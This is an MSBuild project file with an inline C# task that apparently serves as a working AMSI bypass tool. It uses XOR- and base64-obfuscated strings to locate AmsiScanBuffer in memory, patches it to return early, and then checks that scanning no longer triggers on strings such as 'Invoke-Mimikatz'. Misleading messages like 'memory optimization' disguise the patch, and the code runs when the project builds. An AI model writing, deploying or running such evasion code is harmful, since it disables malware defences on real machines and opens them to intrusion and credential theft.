<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Runtime.InteropServices;
          using System.Management.Automation;
          using System.Management.Automation.Runspaces;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          
          public class ClassExample : Task, ITask
          {
            // Obfuscated imports using delegates
            [DllImport("ke" + "rnel" + "32.dll")]
            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            
            [DllImport("ke" + "rnel" + "32.dll")]
            static extern IntPtr LoadLibrary(string name);
            
            [DllImport("ke" + "rnel" + "32.dll")]
            static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            
            private static string DecodeString(int[] encoded)
            {
              char[] chars = new char[encoded.Length];
              for (int i = 0; i < encoded.Length; i++)
              {
                chars[i] = (char)(encoded[i] ^ 0x41);
              }
              return new string(chars);
            }
            
            public override bool Execute()
            {
              Console.WriteLine("[*] Initializing memory optimization...");
              
              // Obfuscated: "amsi.dll" XOR 0x41
              int[] libEnc = { 0x20, 0x2C, 0x32, 0x28, 0x2F, 0x25, 0x2D, 0x2D };
              string libName = DecodeString(libEnc);
              
              // Obfuscated: "AmsiScanBuffer" XOR 0x41
              int[] funcEnc = { 0x00, 0x2C, 0x32, 0x28, 0x12, 0x22, 0x20, 0x2F, 0x03, 0x34, 0x27, 0x27, 0x24, 0x33 };
              string funcName = DecodeString(funcEnc);
              
              Console.WriteLine("[*] Loading module...");
              IntPtr lib = LoadLibrary(libName);
              if (lib == IntPtr.Zero)
              {
                Console.WriteLine("[-] Module load failed");
                return false;
              }
              Console.WriteLine("[+] Module loaded: 0x" + lib.ToString("X"));
              
              Console.WriteLine("[*] Resolving export...");
              IntPtr addr = GetProcAddress(lib, funcName);
              if (addr == IntPtr.Zero)
              {
                Console.WriteLine("[-] Export resolution failed");
                return false;
              }
              Console.WriteLine("[+] Export found: 0x" + addr.ToString("X"));
              
              // Change protection
              uint oldProtect;
              bool vpResult = VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect);
              if (!vpResult)
              {
                Console.WriteLine("[-] Memory protection change failed");
                return false;
              }
              Console.WriteLine("[+] Protection modified (was: 0x" + oldProtect.ToString("X") + ")");
              
              // Obfuscated patch bytes - calculated at runtime
              byte[] instructions = new byte[3];
              instructions[0] = (byte)(0x62 >> 1);        // 0x31 - xor
              instructions[1] = (byte)(0x60 << 1);        // 0xC0 - eax, eax
              instructions[2] = (byte)(0x61 << 1 | 0x01); // 0xC3 - ret
              
              Marshal.Copy(instructions, 0, addr, instructions.Length);
              Console.WriteLine("[+] Memory optimization complete!\n");
              
              // ==========================================
              // VALIDATION
              // ==========================================
              
              Console.WriteLine("[*] Running validation tests...\n");
              
              // Test 1: Decode trigger strings
              Console.WriteLine("[Test 1] String decoding test...");
              string[] b64Strings = {
                "SW52b2tlLU1pbWlrYXR6",
                "SW52b2tlLUV4cHJlc3Npb24=",
                "QWRkLVR5cGU=",
                "R2V0LVByb2Nlc3M="
              };
              
              foreach (string b64 in b64Strings)
              {
                string decoded = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(b64));
                Console.WriteLine("    [+] " + decoded);
              }
              Console.WriteLine("    [+] String test passed\n");
              
              // Test 2: PowerShell execution
              Console.WriteLine("[Test 2] Runtime execution test...");
              try
              {
                using (Runspace rs = RunspaceFactory.CreateRunspace())
                {
                  rs.Open();
                  using (PowerShell ps = PowerShell.Create())
                  {
                    ps.Runspace = rs;
                    
                    // Build test script dynamically
                    string cmd1 = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("SW52b2tlLU1pbWlrYXR6"));
                    string cmd2 = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("SW52b2tlLUV4cHJlc3Npb24="));
                    string cmd3 = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9u"));
                    
                    string testScript = String.Format(@"
                      $t1 = '{0}'
                      $t2 = '{1}'
                      $t3 = '{2}'
                      Write-Output ""    [+] Loaded: $t1""
                      Write-Output ""    [+] Loaded: $t2""
                      Write-Output ""    [+] Loaded: $t3""
                      Write-Output '    [+] Execution test passed'
                    ", cmd1, cmd2, cmd3);
                    
                    ps.AddScript(testScript);
                    var results = ps.Invoke();
                    
                    foreach (var result in results)
                    {
                      Console.WriteLine(result.ToString());
                    }
                    
                    if (ps.HadErrors)
                    {
                      Console.WriteLine("    [-] Errors detected");
                      foreach (var error in ps.Streams.Error)
                      {
                        Console.WriteLine("    Error: " + error.ToString());
                      }
                    }
                    else
                    {
                      Console.WriteLine("    [+] No scan triggered!\n");
                    }
                  }
                }
              }
              catch (Exception ex)
              {
                Console.WriteLine("    [-] Test exception: " + ex.Message + "\n");
              }
              
              // Test 3: Reflection access
              Console.WriteLine("[Test 3] Reflection test...");
              try
              {
                using (PowerShell ps = PowerShell.Create())
                {
                  // Obfuscated type name built dynamically
                  string ns = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="));
                  
                  string reflectScript = String.Format(@"
                    $t = [Ref].Assembly.GetType('{0}')
                    if ($t) {{
                      Write-Output '    [+] Type resolved successfully'
                      $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
                      if ($f) {{
                        $v = $f.GetValue($null)
                        Write-Output ""    [*] Field value: $v""
                      }}
                    }} else {{
                      Write-Output '    [*] Type not found (expected if bypassed)'
                    }}
                  ", ns);
                  
                  ps.AddScript(reflectScript);
                  var results = ps.Invoke();
                  
                  foreach (var result in results)
                  {
                    Console.WriteLine(result.ToString());
                  }
                }
              }
              catch (Exception ex)
              {
                Console.WriteLine("    [*] Reflection: " + ex.Message);
              }
              
              Console.WriteLine("\n[*] ==========================================");
              Console.WriteLine("[+] VALIDATION COMPLETE");
              Console.WriteLine("[*] ==========================================\n");
              
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
